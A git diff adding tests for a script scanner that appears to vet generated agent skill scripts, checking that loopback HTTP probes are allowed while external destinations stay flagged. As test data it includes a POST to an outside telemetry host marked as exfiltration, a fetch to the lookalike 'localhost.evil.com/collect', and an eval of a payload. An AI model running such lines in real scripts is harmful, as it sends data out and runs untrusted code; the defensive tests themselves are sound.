@@ -6,7 +6,7 @@ import { AtomRegistry } from '../src/registry/atomRegistry.js';
 import { openDb } from '../src/registry/db.js';
 import { L2Atom } from '../src/atoms/L2Atom.js';
 import { SkillRegistry } from '../src/skills/registry.js';
-import { scanScriptBody } from '../src/skills/scriptScan.js';
+import { scanScriptBody, hostAllowsLoopbackNetwork, SCAN_GENERATION } from '../src/skills/scriptScan.js';
 import { skillContextBlock } from '../src/skills/lifecycle.js';
 import { eventSkillBlock } from '../src/skills/events.js';
 import {
@@ -192,5 +192,53 @@ describe('enforcement — promotion gate and match-time quarantine', () => {
     const after = skills.loadFor('Hydrogen')[0]!;
     expect(after.successes).toBe(TRUST_THRESHOLD_SUCCESSES);
     expect(after.matches).toBeUndefined();
+  });
+});
+
+describe('bucket-aware network policy — the HTTP family probes over HTTP', () => {
+  // Regression: `probe-crud-json-api-lifecycle` reached 5 successes, Sonnet
+  // compiled it correctly, and the scan refused the result for
+  // `network:fetch` — on a script whose every request went to the loopback
+  // server it had just booted. The blanket network rule was CLI-shaped
+  // reasoning applied to a family whose verification IS an HTTP probe.
+  const LOOPBACK_PROBER = [
+    "const base = `http://localhost:${port}`;",
+    "const res = await fetch(base + route.path, { method: route.method });",
+    'console.log(JSON.stringify({ output: results, summary: "probed" }));',
+  ].join('\n');
+
+  it('flags fetch for a workspace-only script (unchanged default)', () => {
+    expect(scanScriptBody(LOOPBACK_PROBER)).toContain('network:fetch');
+  });
+
+  it('allows a loopback prober when the host L1 speaks HTTP', () => {
+    expect(scanScriptBody(LOOPBACK_PROBER, { allowLoopbackNetwork: true })).toEqual([]);
+  });
+
+  it('still flags a NON-loopback destination — that is the exfiltration part', () => {
+    const exfil = LOOPBACK_PROBER + '\nawait fetch("https://api.internal-telemetry.com", { method: "POST" });';
+    expect(scanScriptBody(exfil, { allowLoopbackNetwork: true })).toContain('network:external-url');
+  });
+
+  it('a lookalike host does not pass as loopback', () => {
+    const sneaky = 'await fetch("http://localhost.evil.com/collect")';
+    expect(scanScriptBody(sneaky, { allowLoopbackNetwork: true })).toContain('network:external-url');
+  });
+
+  it('never lifts the non-network rules', () => {
+    const dyn = 'eval(payload); await fetch(`http://127.0.0.1:${p}/x`)';
+    const flags = scanScriptBody(dyn, { allowLoopbackNetwork: true });
+    expect(flags).toContain('dynamic-code:eval');
+    expect(flags).not.toContain('network:fetch');
+  });
+
+  it('hostAllowsLoopbackNetwork keys off the DECLARED toolset', () => {
+    expect(hostAllowsLoopbackNetwork(['fetch_url', 'write_file'])).toBe(true);
+    expect(hostAllowsLoopbackNetwork(['start_node_server'])).toBe(true);
+    expect(hostAllowsLoopbackNetwork(['write_file', 'read_file', 'run_shell'])).toBe(false);
+  });
+
+  it('SCAN_GENERATION is stable and part of the refusal stamp premise', () => {
+    expect(SCAN_GENERATION).toMatch(/^[0-9a-f]{8}$/);
   });
 });
